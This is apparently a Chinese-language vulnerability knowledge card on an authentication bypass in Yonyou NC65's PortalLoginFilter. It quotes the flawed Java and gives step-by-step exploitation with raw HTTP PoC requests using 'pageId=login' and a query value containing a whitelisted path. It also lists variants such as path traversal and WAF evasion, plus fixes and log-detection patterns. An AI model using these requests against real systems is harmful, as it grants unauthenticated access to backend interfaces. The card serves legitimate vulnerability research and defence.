---
id: web-generic-auth-yonyou-nc65-portalloginfilter-bypass
title: 用友 NC65 PortalLoginFilter 鉴权绕过：pageId 魔法值与 ESCAPE_URL 子串匹配
type: scenario
domain: web
path: web/generic/auth
technique: yonyou-nc65-portalloginfilter-magic-param-whitelist-substring
aliases:
- 用友 NC65 鉴权绕过
- PortalLoginFilter 绕过
- AbstractLfwLoginFilter
- pageId=login
- pageId=passwordmng
- ESCAPE_URL 绕过
- gatefilter 绕过
tags:
- java
- yonyou
- nc65
- servlet-filter
- auth-bypass
- whitelist
- magic-parameter
- espace-url
cve: []
severity: high
confidence: high
affected_versions: 用友 NC65（原文审计版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:08:13+08:00'
  notes: 已对照原文及13张图核对：图01 web.xml gatefilter→nc.uap.portal.servlet.PortalLoginFilter；图02 PortalLoginFilter 继承 AbstractLfwLoginFilter 且未重写 doFilter；图03/04 doFilter 先 isToLogin 再 isEscapeUrl；图05 无 pageId 302 到 login.jsp；图06/07 pageId=passwordmng/login 均 500（进入业务）；图08 isEscapeUrl 用 servletPath+pathInfo+queryString 做 indexOf；图09 ESCAPE_URL 含 pt/oncelogin/getAuth、pt/oncelogin/getImToken、pt/home/logout 等；图10 getAuth 500、图11 getRedirectScript 302；图12/13 crayonx=pt/oncelogin/getAuth 500。修正提示：图09 配置为 getImToken 而非卡内所写 getToken（oaOfficePlugin 下也未见图示 getToken），属变体示例笔误，不影响核心结论。affected_versions 为原文标题明确的 NC65，保留。PoC 未在本机执行。
---

## 一句话结论

用友 NC65 的 `hotwebs/iwebap/WEB-INF/web.xml` 把 `gatefilter` 映射到 `nc.uap.portal.servlet.PortalLoginFilter`，它继承 `AbstractLfwLoginFilter` 且未重写 `doFilter`；父类 `doFilter` 中有两条可直接放行的判断：`pageId=login`/`pageId=passwordmng` 时 `isToLogin` 返回 true，或请求 URL（含 query string）用 `indexOf` 命中 `ESCAPE_URL` 配置中的任意子串时 `isEscapeUrl` 返回 true，均直接 `chain.doFilter`，未登录攻击者由此绕过 Portal 登录校验访问任意后端接口。

## 原理

- **过滤器注册**：`web.xml` 中 `<filter-name>gatefilter</filter-name><filter-class>nc.uap.portal.servlet.PortalLoginFilter</filter-class>`；`PortalLoginFilter` 仅实现 `getSysType()`/`isUserLogin()` 等，没有重写 `doFilter`，实际逻辑在父类 `AbstractLfwLoginFilter.doFilter`。
- **放行顺序**：`doFilter` 依次判断：
  1. `isToLogin(req, res)` 为 true → `chain.doFilter`；
  2. 否则 `isEscapeUrl(req, res)` 为 true → `chain.doFilter`；
  3. 否则 `isUserLogin(req, res)` 为 true → 已登录则放行/重定向；
  4. 都失败才重定向到登录页（`/app/mockapp/login.jsp?lrid=1`）。
- **pageId 魔法值**：

  ```java
  private boolean isToLogin(HttpServletRequest req, HttpServletResponse res) {
      String pageId = req.getParameter("pageId");
      return pageId != null && (pageId.equals("login") || pageId.equals("passwordmng"));
  }
  ```

  `pageId` 是客户端完全可控的普通请求参数，`isToLogin` 的本意是放行登录/改密页面，但判断没有结合当前请求路径，导致对任意受保护 URL 追加 `pageId=login` 或 `pageId=passwordmng` 都会被当作“去登录页”，直接进入后续业务链。
- **ESCAPE_URL 子串匹配**：

  ```java
  String exp = modelConfig.getConfigValue(ESCAPE_URL);
  String url = req.getServletPath()
      + StringUtils.defaultIfEmpty(req.getPathInfo(), "")
      + StringUtils.defaultIfEmpty(req.getQueryString(), "");
  for (String e : exp.split(",")) {
      if (url.indexOf(e) == -1) continue;
      return true;
  }
  ```

  配置中的免登录路径（`pt/oncelogin/getAuth`、`pt/oncelogin/getToken`、`pt/oaOfficePlugin/...`、`pt/home/logout` 等）以 `indexOf` 子串方式匹配，且 `url` 拼接了 `getQueryString()`。因此攻击者只需在任意受保护请求的 query 中放一个无意义参数，其值包含白名单子串（如 `?crayonx=pt/oncelogin/getAuth`），`url.indexOf(e)` 即命中，鉴权被绕过。
- **为什么成立**：白名单判断本应比较规范化后的精确路径，却使用“包含”语义；同时把用户可控的 query string 纳入匹配范围，等于让攻击者把白名单 token 注入到待比较字符串中。`pageId` 分支则把“页面标识”误当成“免鉴权标识”，两者都缺少“当前 URL 是否真的是登录/白名单页面”的绑定。

## 触发条件

- 目标为用友 NC65（原文审计版本），`hotwebs/iwebap` 应用使用 `PortalLoginFilter` 作为 gatefilter。
- 攻击者能访问 `/portal/...` 下的受保护接口，无需登录。
- `ESCAPE_URL` 配置存在至少一个非空免登录路径（默认安装通常存在 `pt/oncelogin/getAuth` 等）。
- 目标未在前面再加一层独立的网关鉴权；后端接口在过滤器放行后不再校验登录态或校验可被绕过。

## 利用步骤

1. 访问任意受保护接口（如 `/portal/pt/ncfreebill/common/linkVoucher`）确认未登录时返回 302 跳转 `/portal/app/mockapp/login.jsp?lrid=1`。
2. 方式一：给同一请求追加 `pageId=login` 或 `pageId=passwordmng`，观察不再 302，而是进入业务代码（原文返回 500 参数错误，说明已到达功能点）。
3. 方式二：读取/枚举 `ESCAPE_URL` 配置中的免登录路径（如 `pt/oncelogin/getAuth`），在受保护请求的 query 中加任意参数，值设为该路径，如 `?crayonx=pt/oncelogin/getAuth`。
4. 观察响应从 302 变为业务响应（原文为 500），确认过滤器放行。
5. 选择有价值的下游接口（注入、文件上传、SSRF 等）在该绕过前提下利用；注意部分接口仍需参数正确才返回数据。

## PoC

原文实测（未登录）：

不带 `pageId`，被重定向：

```http
POST /portal/pt/ncfreebill/common/linkVoucher HTTP/1.1
Host: 192.168.56.140:8010
Content-Type: application/x-www-form-urlencoded

pk_freebill=1&pk_doc=0001A8100000000L2CI
```

```http
HTTP/1.1 302 Found
Location: http://192.168.56.140:8010/portal/app/mockapp/login.jsp?lrid=1
```

方式一：`pageId` 魔法值绕过：

```http
POST /portal/pt/ncfreebill/common/linkVoucher?pageId=login HTTP/1.1
Host: 192.168.56.140:8010
Content-Type: application/x-www-form-urlencoded

pk_freebill=1&pk_doc=0
```

```http
HTTP/1.1 500 Internal Server Error   # 已进入业务代码，仅参数错误
```

`pageId=passwordmng` 效果相同。

方式二：ESCAPE_URL 子串注入绕过（`crayonx` 为任意无用参数名）：

```http
POST /portal/pt/ncfreebill/common/linkVoucher?crayonx=pt/oncelogin/getAuth HTTP/1.1
Host: 192.168.56.140:8010
Content-Type: application/x-www-form-urlencoded

pk_freebill=1&pk_doc=0
```

```http
HTTP/1.1 500 Internal Server Error   # 不再 302，鉴权被绕过
```

对照：直接访问白名单路径 `GET /portal/pt/oncelogin/getAuth` 返回 500（放行），访问非白名单路径 `GET /portal/pt/oncelogin/getRedirectScript` 返回 302（被拦）。

## 变体与关联

- **其他魔法值**：`pageId=passwordmng` 与 `login` 等价；若其他过滤器/版本还有类似“页面名”参数，可同样枚举。
- **其他白名单 token**：`ESCAPE_URL` 中 `pt/oaOfficePlugin/getLangRes`、`pt/oaOfficePlugin/getToken`、`pt/home/logout`、`/app/mockapp/minilogin.jsp` 等都可作为注入 token；越长越独特的 token 越不易被 WAF 拦。
- **放在路径中**：`indexOf` 匹配的是 `servletPath + pathInfo + queryString`，也可把 token 放进 path（如 `/portal/pt/oncelogin/getAuth/../目标接口`），取决于容器规范化行为。
- **组合利用**：该绕过本身只解决“未登录访问”，下游仍需具体漏洞；原文指出 NC 的许多注入漏洞正是建立在此鉴权绕过之上。
- **关联卡片**：[[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]（同样是 contains/indexOf 子串白名单 + query 注入）、[[web-generic-auth-oa-downloadfilter-protectfilter-path-substring-bypass]]（路径子串白名单绕过）。

## 检测与防御

- **修复**：白名单改为规范化路径的精确匹配（`equals` 或前缀匹配前先 `getCanonicalPath`），不要把 query string 纳入白名单判断；`pageId` 登录页判断必须绑定真实 URI（仅登录/改密页面生效），不能作为全局免鉴权开关。
- **升级/补丁**：联系厂商获取 NC65 安全补丁，核对 `AbstractLfwLoginFilter`/`PortalLoginFilter` 是否已改为严格匹配。
- **纵深防御**：在 Portal 前增加统一网关/反向代理鉴权，后端接口对敏感操作二次校验会话与权限；不要依赖单一 Filter。
- **检测**：日志/流量中 `pageId=login`、`pageId=passwordmng` 出现在非登录路径；query 参数值包含 `pt/oncelogin/getAuth`、`pt/home/logout` 等白名单 token；同一会话对大量接口从 302 变 500/200；未登录状态访问后台接口。
